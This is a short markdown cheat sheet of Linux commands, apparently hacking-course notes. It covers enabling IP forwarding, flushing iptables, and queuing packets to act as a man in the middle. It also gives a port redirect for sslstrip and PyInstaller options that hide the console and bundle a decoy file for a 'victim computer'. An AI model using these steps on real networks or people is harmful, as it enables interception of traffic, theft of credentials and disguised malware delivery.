#### Sets firewall rule to allow traffic going through the system

`echo 1 > /proc/sys/net/ipv4/ip_forward`

================================================================
#### Clears firewall for all rules

`iptables --flush` \
`iptables --table nat --flush` \
`iptables --delete-chain` \
`iptables --table nat --delete-chain`

================================================================
#### Allows packets to flow through the system to become man in the middle

`iptables -P FORWARD ACCEPT` \
`iptables -I INPUT -j NFQUEUE --queue-num 0` \
`iptables -I OUTPUT -j NFQUEUE --queue-num 0` \
`iptables -I FORWARD -j NFQUEUE --queue-num 0` 

================================================================
#### Used for sslstrip

`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`

================================================================
#### Packages python scripts to executables using wine

`wine /root/.wine/drive_c/PythonXX/Scripts/pyinstaller.exe (python script) (optional arguments)`

**optional** arguments that can be used (these are added after you specify the python script.) \

`--noconsole` (removes the console that pops up when executing program.)\
`--onefile` (packages the program with all required imports.)\
`--add-data "location/to/src/file;location/to/dst/file"` (first add location of the file which will be the file that user will see. E.g an image. Then add the location in which you want the file to be saved on the destination/victim computer(use dot(.) for default directory which is in the appdata folder.).)\
`--icon "path/to/icon"` (gives executable the desired icon instead of default python icon.)

================================================================
#### Fixed issue if pip installs python3 modules instead of python2

`curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py` \
`python get-pip.py`